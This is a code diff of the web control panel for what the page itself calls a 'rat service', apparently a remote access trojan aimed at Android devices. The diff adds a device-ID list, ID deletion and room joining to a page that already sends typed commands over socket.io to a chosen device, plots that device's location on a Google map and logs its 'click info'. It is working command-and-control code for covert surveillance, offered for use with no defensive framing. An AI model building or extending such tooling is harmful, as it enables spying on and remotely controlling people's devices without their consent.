@@ -4,7 +4,11 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+
+    <link rel="icon" href="https://www.freeiconspng.com/thumbs/android-icon/green-android-icon-31.png">
+
     <script src="socket.io/socket.io.js" ></script>
+
     <style>
         body{
             margin: 0;
@@ -56,9 +60,9 @@
 
 
         #clickinfo{
-            background-color: #fddc2493;
-            border: 5px outset green;
-            color: antiquewhite;
+            background-color: #474e4ce8;
+            border: 5px outset rgb(235, 155, 108);
+            color: rgb(128, 187, 74);
             width: 70%;
             height: 250px;
             overflow: auto;
@@ -66,7 +70,73 @@
             align-self: center;
            margin-top: 10px;
            margin-bottom: 15px;
+
         }
+        #con{
+
+            display: flex;
+            padding: 10px;
+            margin: 15px;
+            border: 1px solid rgb(224, 221, 221);
+            background-color: #6b727944;
+            border-radius: 5px;
+        }
+        #quary{
+display: flex;
+width: 90%;
+align-self: center;
+background-color: rgba(68, 142, 253, 0.658);
+height: 250px;
+border-bottom-left-radius: 35px;
+border-bottom-right-radius: 35px;
+margin-bottom: 50px;
+padding: 10px;
+border: 2px solid snow;
+        }
+
+        #find{
+flex: 1;
+justify-self: center;
+align-self: center;
+justify-content: center;
+align-content: center;
+display: flex;
+flex-direction: column;
+border-right: 1px solid greenyellow;
+        }
+        #delet{
+flex: 1;
+display: flex;
+flex-direction: column;
+justify-self: center;
+align-self: center;
+align-items: center;
+        }
+        #allids{
+            background-color: #66839b;
+            width: 80%;
+            height: 180px;
+            align-self: center;
+            margin: 7px;
+            padding: 5px;
+            overflow: auto;
+            border: 1px solid seashell;
+            border-radius: 10px;
+        display: flex;
+        flex-direction: column;
+        }
+
+
+        #btn_1{
+            background-color: rgba(64, 255, 175, 0.952);
+            font-size: 18px;
+border-radius: 10px;
+padding: 4px;
+letter-spacing: 3px;
+color: rgb(66, 63, 63);
+            align-self: center;
+        }
+
 
     </style>
     <script>
@@ -104,20 +174,59 @@
 </head>
 <body>
     
+
+
+    <div id="quary">
+        <div id="find">
+            
+            <div id="allids">
+                <h3 style="align-self: center;background-color: rgba(172, 243, 219, 0.938);padding: 3px;border-radius: 2px;">Devices</h3>
+                <div id="every_ides" style="width: 93%;display: flex;flex-direction: column;align-self: center;padding: 2px;">
+                   <i style="background-color: #89a7c09c;padding: 2px;">all id's</i>
+                   
+                </div>
+
+            </div>
+            <button id="btn_1">find</button>
+
+        </div>
+        
+        <div id="delet">
+            <div id="del">
+                <input id="delet_id" placeholder="enter id">
+                <button id="deletd" style="background-color: rgba(240, 80, 80, 0.753);padding: 5px;border-radius: 4px;color: #fdf4f4;margin: 3px;">delete</button>
+            </div>
+
+            <div id="con">
+                <input id="roomid" placeholder="enter your user id">
+                <button onclick="joinRoom()" style="background-color: rgba(86, 67, 252, 0.89);border-radius: 5px;padding: 5px;color: #fdf4f4;margin-left: 3px;">connect</button>
+            </div>
+        </div>
+
+
+    </div>
+
+
+
+
+
+
     <div id="monitor">
          
-         <p> Wellcome to rat service</p>
+         <p style="text-align: center;background-color: #36a5ff9a;"> Wellcome to rat service</p>
 
  
     </div>
     <input  id="inp" placeholder="enter command">
 
     <div id="clickinfo">
-
+<h4 style="text-align: center;background-color: rgb(157, 187, 187);color: rgb(255, 255, 255);">click info</h4>
     </div>
     <div id="map">
 
     </div>
+
+
 
 </body>
 <!--CONNECT-WITH-GOOGLE MAP>-->
@@ -131,18 +240,25 @@ async
 var commands = document.getElementById("inp");
 var monitor = document.getElementById("monitor");
 var clickinfo = document.getElementById("clickinfo")
+var  roomnumber = document.getElementById("roomid")
+var find_button = document.getElementById("btn_1")
+var delet_button = document.getElementById("deletd")
+
+
 
 commands.addEventListener("keypress", function(event) {
     
 
     if (event.keyCode == 13){
         
-        socket.emit("msg",commands.value.toString())
+        socket.emit("msg",String(roomnumber.value),commands.value.toString())
         commands.value = ""
-        
     }
 
 });
+
+
+
 
 socket.on("location",data=>{
    var mylocation =  JSON.parse(data)
@@ -162,6 +278,31 @@ Allclickevents(data)
 
 
 
+function getallids(url){
+
+return new Promise((resolve,reject)=>{
+    var xhr = new XMLHttpRequest();
+xhr.open("POST", url);
+xhr.setRequestHeader("Accept", "application/json");
+xhr.setRequestHeader("Content-Type", "application/json");
+
+    xhr.onreadystatechange = function () {
+
+   if (xhr.readyState === 4) {
+
+      resolve(xhr.responseText)
+      
+   }
+};
+xhr.send()
+})
+
+
+
+}
+
+
+
 function addData(data){
    var myPelement = document.createElement("p")
    myPelement.innerText = data
@@ -169,12 +310,62 @@ function addData(data){
 }
 
 
+function joinRoom(){
+
+
+if(String(roomnumber.value).length > 1){
+    socket.emit("join_room",String(roomnumber.value))
+}
+    else{alert("value mising")}
+}
+
+
 
 function Allclickevents(data){
     var myPelement = document.createElement("p")
     myPelement.innerText = data
+    
     clickinfo.appendChild(myPelement)
 }
+
+find_button.addEventListener("click",()=>{
+
+   getallids("/id/get/notrequire").then((val)=>{
+    document.getElementsByName("I4").forEach((elem)=>elem.remove())
+    addIDinidbox("every_ides",JSON.parse(val))
+   }).catch((err)=>{
+       console.log(err)
+   })
+    
+    
+})
+
+function addIDinidbox(idname,data=[]){
+    if(data.length >0){
+    data.forEach((element)=>{
+        var item = document.createElement("i")
+        item.innerText=element;
+        item.style.backgroundColor="#f1f1f1"
+        item.style.width="100%"
+        item.style.textAlign="center"
+        item.setAttribute("name","I4")
+        document.getElementById(idname).appendChild(item)
+    })
+}
+}
+
+
+delet_button.addEventListener("click",()=>{
+    var values = document.getElementById("delet_id")
+
+    getallids(`/id/delet/${values.value?values.value:"no value pass"}`).then((val)=>{
+    document.getElementsByName("I4").forEach((elem)=>elem.remove())
+    addIDinidbox(JSON.parse(val))
+   }).catch((err)=>{
+       console.log(err)
+   })
+})
+
 
 </script>
 
